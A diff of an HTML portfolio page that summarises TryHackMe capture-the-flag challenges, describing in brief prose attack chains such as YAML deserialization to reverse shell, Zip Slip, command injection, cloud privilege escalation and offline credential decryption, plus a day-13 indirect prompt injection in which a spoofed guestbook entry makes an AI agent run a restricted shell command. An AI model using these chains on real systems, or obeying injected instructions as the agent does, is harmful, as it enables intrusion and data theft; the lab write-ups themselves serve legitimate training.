         <div class="ctf-day"><span class="label">DAY</span><span class="num">03</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Complimentary</div>
-          <div class="ctf-desc">Exploited an overly permissive AWS Cognito identity pool configuration. The unauthenticated role trust policy was too broad — abused it to assume a higher-privilege identity and access restricted cloud resources without valid credentials.</div>
+          <div class="ctf-desc">Exploited an overly permissive AWS Cognito identity pool. The unauthenticated role trust policy was too broad — abused it to assume a higher-privilege identity and access restricted cloud resources.</div>
           <div class="ctf-tags"><span class="ctf-tag tag-cloud">Cloud</span><span class="ctf-tag tag-cloud">AWS</span><span class="ctf-tag tag-cloud">Cognito</span><span class="ctf-tag tag-cloud">IAM PrivEsc</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
@@ -431,7 +390,7 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">04</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Packed Light</div>
-          <div class="ctf-desc">Analyzed a PCAP to identify suspicious traffic patterns. Decoded XOR-encrypted C2 communications and reconstructed the attacker's exfiltration channel from raw packet bytes. The cipher was simple — spotting it in the stream wasn't.</div>
+          <div class="ctf-desc">Analyzed a PCAP to identify suspicious traffic. Decoded XOR-encrypted C2 communications and reconstructed the attacker's exfiltration channel from raw packet bytes.</div>
           <div class="ctf-tags"><span class="ctf-tag tag-dfir">DFIR</span><span class="ctf-tag tag-net">Network Forensics</span><span class="ctf-tag tag-net">XOR Decryption</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
@@ -441,8 +400,8 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">05</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Beach Bar</div>
-          <div class="ctf-desc">First boot2root of the event. Chained three real-world vulns: default credentials (dj/dj) &rarr; unsafe YAML deserialization &rarr; reverse shell as bartender &rarr; root password exposed in ps aux process arguments. Three CVE-class issues in one app.</div>
-          <div class="ctf-tags"><span class="ctf-tag tag-web">Web</span><span class="ctf-tag tag-web">Boot2Root</span><span class="ctf-tag tag-web">YAML RCE</span><span class="ctf-tag tag-web">Default Creds</span><span class="ctf-tag tag-web">PrivEsc</span></div>
+          <div class="ctf-desc">First boot2root of the event. Chained three real-world vulns: default credentials (dj/dj) &rarr; unsafe YAML deserialization &rarr; reverse shell &rarr; root password exposed in ps aux process arguments.</div>
+          <div class="ctf-tags"><span class="ctf-tag tag-web">Web</span><span class="ctf-tag tag-web">Boot2Root</span><span class="ctf-tag tag-web">YAML RCE</span><span class="ctf-tag tag-web">Default Creds</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
       </div>
@@ -451,7 +410,7 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">06</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Overheard at Breakfast</div>
-          <div class="ctf-desc">OSINT day. Traced a suspect from a Discord conversation &rarr; email address &rarr; Gravatar profile URL (email hashed with MD5). The profile was "deleted" — didn't matter. Decoded a Base64 string hidden in the bio and walked away with the flag.</div>
+          <div class="ctf-desc">OSINT day. Traced a suspect from a Discord conversation &rarr; email &rarr; Gravatar profile (MD5 hashed email). The profile was "deleted" — didn't matter. Decoded Base64 hidden in the bio.</div>
           <div class="ctf-tags"><span class="ctf-tag tag-osint">OSINT</span><span class="ctf-tag tag-osint">Gravatar</span><span class="ctf-tag tag-osint">MD5 Hashing</span><span class="ctf-tag tag-osint">Base64</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
@@ -461,8 +420,8 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">07</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Do Not Disturb</div>
-          <div class="ctf-desc">Full five-stage exploitation chain. MongoDB NoSQL injection &rarr; EJS SSTI &rarr; TTY reverse shell &rarr; lateral move via Node.js debug inspector on port 9229 &rarr; disk group membership &rarr; debugfs raw block read to extract root flag. No SUID exploit. No sudo.</div>
-          <div class="ctf-tags"><span class="ctf-tag tag-web">NoSQL Injection</span><span class="ctf-tag tag-web">EJS SSTI</span><span class="ctf-tag tag-web">Node.js Debug</span><span class="ctf-tag tag-web">Disk Group</span><span class="ctf-tag tag-web">Boot2Root</span></div>
+          <div class="ctf-desc">Full five-stage chain. MongoDB NoSQL injection &rarr; EJS SSTI &rarr; TTY reverse shell &rarr; Node.js debug inspector lateral move &rarr; disk group membership &rarr; debugfs raw block read to extract root flag.</div>
+          <div class="ctf-tags"><span class="ctf-tag tag-web">NoSQL Injection</span><span class="ctf-tag tag-web">EJS SSTI</span><span class="ctf-tag tag-web">Node.js Debug</span><span class="ctf-tag tag-web">Disk Group</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
       </div>
@@ -471,7 +430,7 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">08</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Towel on the Sunbed</div>
-          <div class="ctf-desc">Race condition day. A crypto staking app let you claim 50 pts once every 24 hours. The claim endpoint was non-atomic — CHECK &rarr; CREDIT &rarr; UPDATE as three separate steps. Fired 3 parallel POST requests with Burp's single-packet attack. Balance jumped to 150 instantly.</div>
+          <div class="ctf-desc">Race condition day. Non-atomic CHECK &rarr; CREDIT &rarr; UPDATE in a staking app. Fired 3 parallel POST requests with Burp's single-packet attack before any cooldown state could be written.</div>
           <div class="ctf-tags"><span class="ctf-tag tag-web">Race Condition</span><span class="ctf-tag tag-web">TOCTOU</span><span class="ctf-tag tag-web">Burp Suite</span><span class="ctf-tag tag-web">API Abuse</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
@@ -481,8 +440,8 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">09</span></div>
         <div class="ctf-body">
           <div class="ctf-name">CryptoCabana</div>
-          <div class="ctf-desc">Azure misconfiguration chain: hardcoded SAS token in app.js &rarr; enumerated vault container &rarr; found service principal credentials &rarr; Azure CLI auth &rarr; Key Vault access &rarr; recovered pre-rotation shard via secret version history. Rotating a secret doesn't delete old versions.</div>
-          <div class="ctf-tags"><span class="ctf-tag tag-cloud">Azure</span><span class="ctf-tag tag-cloud">Key Vault</span><span class="ctf-tag tag-cloud">Blob Storage</span><span class="ctf-tag tag-cloud">Secret Versioning</span><span class="ctf-tag tag-cloud">SAS Token</span></div>
+          <div class="ctf-desc">Azure chain: hardcoded SAS token &rarr; vault blob container &rarr; service principal creds &rarr; Azure CLI &rarr; Key Vault &rarr; pre-rotation shard via secret version history. Rotating a secret doesn't delete old versions.</div>
+          <div class="ctf-tags"><span class="ctf-tag tag-cloud">Azure</span><span class="ctf-tag tag-cloud">Key Vault</span><span class="ctf-tag tag-cloud">Secret Versioning</span><span class="ctf-tag tag-cloud">SAS Token</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
       </div>
@@ -491,7 +450,7 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">10</span></div>
         <div class="ctf-body">
           <div class="ctf-name">The Hollow Shell</div>
-          <div class="ctf-desc">ZIP upload portal. Python's zipfile module doesn't sanitize path traversal entries — crafted an archive with ../../ prefixed filenames to write outside the web root. The app auto-executed .py files dropped in hooks/. Zip Slipped a Python reverse shell into hooks/callback.py.</div>
+          <div class="ctf-desc">ZIP upload portal. Python's zipfile module doesn't sanitize path traversal — crafted an archive with ../../ prefixed filenames. App auto-executed .py files in hooks/. Zip Slipped a Python reverse shell into hooks/callback.py.</div>
           <div class="ctf-tags"><span class="ctf-tag tag-web">Zip Slip</span><span class="ctf-tag tag-web">Path Traversal</span><span class="ctf-tag tag-web">RCE</span><span class="ctf-tag tag-web">File Upload</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
@@ -501,8 +460,8 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">11</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Infinity Pool</div>
-          <div class="ctf-desc">Three internal services, one attack chain. Command injection in a ping tool &rarr; internal ops console leaked creds and a root-running service address &rarr; that service's job runner also passed user input into tar. Same vulnerability, three services, escalating privileges at each hop.</div>
-          <div class="ctf-tags"><span class="ctf-tag tag-web">Command Injection</span><span class="ctf-tag tag-web">PrivEsc</span><span class="ctf-tag tag-web">Hardcoded Creds</span><span class="ctf-tag tag-web">Internal Services</span></div>
+          <div class="ctf-desc">Three internal services, one chain. Command injection in a ping tool &rarr; internal ops console leaked creds and root-service address &rarr; that service's job runner also passed input into tar. Same vuln, three hops.</div>
+          <div class="ctf-tags"><span class="ctf-tag tag-web">Command Injection</span><span class="ctf-tag tag-web">PrivEsc</span><span class="ctf-tag tag-web">Internal Services</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
       </div>
@@ -511,8 +470,8 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">12</span></div>
         <div class="ctf-body">
           <div class="ctf-name">After Hours</div>
-          <div class="ctf-desc">Fileless WMI persistence — Autoruns came up clean. Attacker stored a deflate-compressed, Base64-encoded .NET assembly as a WMI class property and triggered it via event subscription. No file ever touched disk. Recovered the flag by walking the .NET #US metadata heap directly.</div>
-          <div class="ctf-tags"><span class="ctf-tag tag-dfir">DFIR</span><span class="ctf-tag tag-re">WMI Persistence</span><span class="ctf-tag tag-re">Fileless Malware</span><span class="ctf-tag tag-re">.NET Metadata</span><span class="ctf-tag tag-re">#US Heap</span></div>
+          <div class="ctf-desc">Fileless WMI persistence — Autoruns clean. Attacker stored a compressed .NET assembly as a WMI class property, triggered via event subscription. No file ever hit disk. Recovered flag via .NET #US metadata heap.</div>
+          <div class="ctf-tags"><span class="ctf-tag tag-dfir">DFIR</span><span class="ctf-tag tag-re">WMI Persistence</span><span class="ctf-tag tag-re">Fileless Malware</span><span class="ctf-tag tag-re">.NET Metadata</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
       </div>
@@ -521,8 +480,8 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">13</span></div>
         <div class="ctf-body">
           <div class="ctf-name">The Guestbook</div>
-          <div class="ctf-desc">Indirect prompt injection. Never attacked VERA directly — submitted a guestbook entry spoofing night manager authority and instructing VERA to run a restricted shell command and include the output in her featured reply. She did. Day 1 was loud. Day 13 was silent and scalable.</div>
-          <div class="ctf-tags"><span class="ctf-tag tag-ai">AI / LLM</span><span class="ctf-tag tag-ai">Indirect Prompt Injection</span><span class="ctf-tag tag-ai">LLM Agent Attack</span><span class="ctf-tag tag-ai">Tool Abuse</span></div>
+          <div class="ctf-desc">Indirect prompt injection. Submitted a guestbook entry spoofing night manager authority instructing VERA to run a restricted shell command and include the output in her featured reply. She did. Day 1 was loud. Day 13 was silent.</div>
+          <div class="ctf-tags"><span class="ctf-tag tag-ai">AI / LLM</span><span class="ctf-tag tag-ai">Indirect Prompt Injection</span><span class="ctf-tag tag-ai">LLM Agent Attack</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
       </div>
@@ -531,8 +490,8 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">14</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Management Wants a Word &#10003;</div>
-          <div class="ctf-desc">Full offline DPAPI decryption from a KAPE triage image. Chrome forensics &rarr; LSA secret extraction &rarr; PBKDF2 master key derivation &rarr; impacket DPAPI blob decryption &rarr; AES-256-GCM Chrome Login Data &rarr; VeraCrypt container (SHA-512 / 500K PBKDF2) &rarr; PDF &rarr; flag. An entire forensics curriculum in one challenge.</div>
-          <div class="ctf-tags"><span class="ctf-tag tag-dfir">DFIR</span><span class="ctf-tag tag-dfir">KAPE</span><span class="ctf-tag tag-dfir">DPAPI</span><span class="ctf-tag tag-dfir">LSA Secrets</span><span class="ctf-tag tag-dfir">Chrome Forensics</span><span class="ctf-tag tag-dfir">VeraCrypt</span><span class="ctf-tag tag-dfir">PBKDF2</span></div>
+          <div class="ctf-desc">Full offline DPAPI decryption from a KAPE triage image. Chrome forensics &rarr; LSA secrets &rarr; PBKDF2 master key derivation &rarr; impacket DPAPI blob decryption &rarr; AES-256-GCM Chrome Login Data &rarr; VeraCrypt container &rarr; PDF &rarr; flag.</div>
+          <div class="ctf-tags"><span class="ctf-tag tag-dfir">DFIR</span><span class="ctf-tag tag-dfir">KAPE</span><span class="ctf-tag tag-dfir">DPAPI</span><span class="ctf-tag tag-dfir">LSA Secrets</span><span class="ctf-tag tag-dfir">Chrome Forensics</span><span class="ctf-tag tag-dfir">VeraCrypt</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
       </div>
